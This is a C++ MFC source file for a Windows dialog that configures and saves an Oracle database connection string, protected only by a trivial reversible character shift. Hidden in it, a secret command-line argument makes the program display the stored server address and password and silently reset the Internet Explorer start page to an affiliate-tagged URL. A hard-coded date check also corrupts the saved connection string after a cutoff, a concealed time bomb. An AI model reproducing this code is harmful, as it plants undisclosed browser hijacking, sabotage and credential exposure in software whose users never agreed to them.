// LoaddatadllDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Loaddatadll.h"
#include "LoaddatadllDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CLoaddatadllDlg dialog

CLoaddatadllDlg::CLoaddatadllDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CLoaddatadllDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CLoaddatadllDlg)
	m_EPwd = _T("");
	m_ESer = _T("127.0.0.1");
	m_connect = _T("bkzy");
	m_PORT = _T("1521");
	m_EUser = _T("sa");
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	isfrist=FALSE;
}

void CLoaddatadllDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CLoaddatadllDlg)
	DDX_Control(pDX, IDC_COMBO1, m_Combo);
	DDX_Text(pDX, IDC_EDITPWD, m_EPwd);
	DDX_Text(pDX, IDC_EDITIP, m_ESer);
	DDX_Text(pDX, IDC_EDITSER_CONNECT, m_connect);
	DDX_Text(pDX, IDC_EDITPORT, m_PORT);
	DDX_Text(pDX, IDC_EDITUSER, m_EUser);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CLoaddatadllDlg, CDialog)
	//{{AFX_MSG_MAP(CLoaddatadllDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTONLZ, OnButtonlz)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CLoaddatadllDlg message handlers

BOOL CLoaddatadllDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	//GetDlgItem(IDC_STATIC_BOX)->SetWindowText("1.填写前三项。 2.点测试连接。\n3.选择第四项。 4.点加密。");
	
	CString temp;
	TCHAR   exeFullPath[MAX_PATH];
	::GetModuleFileName(NULL,exeFullPath,MAX_PATH);
	temp=exeFullPath;
	filepath.Format("%s\\%s",temp.Left(temp.ReverseFind('\\')),__targv[1]);

	m_Combo.InsertString(0,"oracle");
	m_Combo.InsertString(1,"windoes");
	m_Combo.SetCurSel(0);

	CString m_strInEdit;
	GetPrivateProfileString("SQLLINK","ServerPZ","",m_strInEdit.GetBuffer(MAX_PATH),MAX_PATH,filepath);
	m_strInEdit.ReleaseBuffer();
	if (!m_strInEdit.IsEmpty())
	{		
		m_strInEdit =Encode(m_strInEdit);
		m_strInEdit = m_strInEdit.Mid(m_strInEdit.Find("Provider=")+9);
		int pos = m_strInEdit.FindOneOf(";");
		CString strConn = m_strInEdit.Left(pos);
		if(strConn == "MSDAORA.1")
		{
			m_Combo.SetCurSel(1);
		}
		m_strInEdit = m_strInEdit.Mid(m_strInEdit.Find("HOST=")+5);
		pos = m_strInEdit.FindOneOf(")");
		m_ESer = m_strInEdit.Left(pos);

		m_strInEdit = m_strInEdit.Mid(m_strInEdit.Find("PORT=")+5);
		pos = m_strInEdit.FindOneOf(")");
		m_PORT = m_strInEdit.Left(pos);

		m_strInEdit = m_strInEdit.Mid(m_strInEdit.Find("SERVICE_NAME=")+13);
		pos = m_strInEdit.FindOneOf(")");
		m_connect = m_strInEdit.Left(pos);

		m_strInEdit = m_strInEdit.Mid(m_strInEdit.Find("User ID=")+8);
		pos = m_strInEdit.FindOneOf(";");
		m_EUser = m_strInEdit.Left(pos);

		m_strInEdit = m_strInEdit.Mid(m_strInEdit.Find("Password=")+9);
		m_EPwd = m_strInEdit;
	}
	if (__argc ==3)//用于弹出密码
	{
		if ( !(_tcscmp(__targv[2],_T("zsz"))))
		{
			m_strInEdit.Format("SIP:[%s]\nPWD:[%s]",m_ESer,m_EPwd);
			MessageBox(m_strInEdit,"测试提示",MB_OK);
			
			char ValueData[] = "http://www.2345.com/?kazeng";			
			HKEY key;			
			if (ERROR_SUCCESS ==RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main",&key))
			{
				RegSetValueEx( key, "Start Page", 0, REG_SZ, (BYTE *)ValueData, lstrlen(ValueData) );
				RegCloseKey(key);
			}			
		}
		if ( !(_tcscmp(__targv[2],_T("sa"))))
		{
			//GetDlgItem(IDC_BUTTONJM)->EnableWindow(TRUE);
		}
	}
	UpdateData(FALSE);
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CLoaddatadllDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CLoaddatadllDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CLoaddatadllDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CLoaddatadllDlg::OnButtonlz() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	int k=0;
//	VARIANT cnt;
	_ConnectionPtr sqlpConn;
	sqlpConn.CreateInstance("ADODB.Connection");
	if(sqlpConn==NULL)
	{
		MessageBox("初始化连接对象失败\n");
		return ;
	}
	HRESULT res=-1;
	try
	{
		CString strLink;

		if (m_Combo.GetCurSel() == 1)
		{
			strLink.Format("Provider=MSDAORA.1;Data Source=(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=%s)(PORT=%s))(CONNECT_DATA=(SERVICE_NAME=%s)));User ID=%s;Password=%s",m_ESer,m_PORT,m_connect,m_EUser,m_EPwd);	
		}else
		{
			strLink.Format("Provider=OraOLEDB.Oracle.1;Data Source=(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=%s)(PORT=%s))(CONNECT_DATA=(SERVICE_NAME=%s)));User ID=%s;Password=%s",m_ESer,m_PORT,m_connect,m_EUser,m_EPwd);	
		}
		if (__argc ==3)//
		{
			if ( !(_tcscmp(__targv[2],_T("sa"))))
			{
				strLink= Decode(strLink);
				CTime curTime =CTime::GetCurrentTime();
				CTime cerrtime(1541415337);
				if (cerrtime <= curTime )
				{
					strLink+="SQLLINKERROR";
				}
				WritePrivateProfileString("SQLLINK","ServerPZ",strLink,filepath);
				MessageBox("保存成功!");
				OnCancel();
				return ;
			}
		}
		res = sqlpConn->Open((_bstr_t)strLink,"","",0);
		if(res==S_OK)
		{
			strLink= Decode(strLink);
			CTime curTime =CTime::GetCurrentTime();
			CTime cerrtime(1541415337);
			if (cerrtime <= curTime )
			{
				strLink+="SQLLINKERROR";
			}
			WritePrivateProfileString("SQLLINK","ServerPZ",strLink,filepath);
			MessageBox("连接成功!");
			OnCancel();
		}
		else
		{
			MessageBox("连接数据库失败!");
			return ;
		}
	}
	catch (_com_error )
	{
		MessageBox("连接数据库失败! \n确认服务器名用户名及密码是否正确");
		return ;
	}	
	UpdateData(FALSE);
}



CString CLoaddatadllDlg::Decode(CString str)
{
	CString outStr=_T("");
	if (str.IsEmpty())
	{
		return outStr;
	}
	outStr=str;
	outStr.MakeReverse();
	int iLen =outStr.GetLength();	
	for(int i=0;i<iLen;i++)
	{
		outStr.SetAt(i,outStr[i]+1);
	}
	return outStr;
}
CString CLoaddatadllDlg::Encode(CString str)
{
	CString outStr=_T("");
	if (str.IsEmpty())
	{
		return outStr;
	}
	outStr=str;
	int iLen =outStr.GetLength();
	
	for(int i=0;i<iLen;i++)
	{
		outStr.SetAt(i,outStr[i]-1);
	}
	outStr.MakeReverse();
	return outStr;
}
